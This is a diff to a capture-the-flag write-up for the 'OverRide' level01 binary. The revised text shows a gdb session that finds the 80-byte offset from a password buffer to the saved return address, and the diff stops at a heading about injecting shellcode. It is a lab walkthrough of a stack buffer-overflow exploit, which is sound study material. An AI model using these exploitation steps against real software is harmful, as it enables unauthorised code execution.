@@ -45,8 +45,7 @@ The username is correct, but we couldn't login.
 
 ## Step 2. Calculate offset to overwrite `eip`
 ```assembly
-0x080484d5 <+5>:	and    esp,0xfffffff0
-0x080484d8 <+8>:	sub    esp,0x60
+level01@OverRide:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" level01
 [...]
 0x0804856d <+157>:	lea    eax,[esp+0x1c]
 0x08048571 <+161>:	mov    DWORD PTR [esp],eax
@@ -56,7 +55,33 @@ The username is correct, but we couldn't login.
 0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
 [...]
 ```
-The username buffer is a global variable, we cannot use it to overwrite eip. According to disassembly, the binary stores password to a buffer which begins at esp+0x1c, so we need `0x60 - 0x1c + 0x8(padding) + 0x4(ebp) = 0x50 (80)` to reach the return address.
+```
+level01@OverRide:~$ gdb -q level01
+Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
+(gdb) break *0x08048574
+Breakpoint 1 at 0x8048574
+(gdb) run
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+
+Breakpoint 1, 0x08048574 in main ()
+(gdb) info registers eax
+eax            0xffffd6bc	-10564
+(gdb) info frame
+Stack level 0, frame at 0xffffd710:
+ eip = 0x8048574 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd708, args:
+ Locals at 0xffffd708, Previous frame's sp is 0xffffd710
+ Saved registers:
+  ebx at 0xffffd700, ebp at 0xffffd708, edi at 0xffffd704, eip at 0xffffd70c
+(gdb) print 0xffffd70c - 0xffffd6bc
+$1 = 80
+```
+The username buffer is a global variable, we cannot use it to overwrite eip. We set a breakpoint before calling function `fgets`, then got offset `80` by calculating `eip - eax`.
 
 ## Step 3. Find a place to inject shellcode
 ```
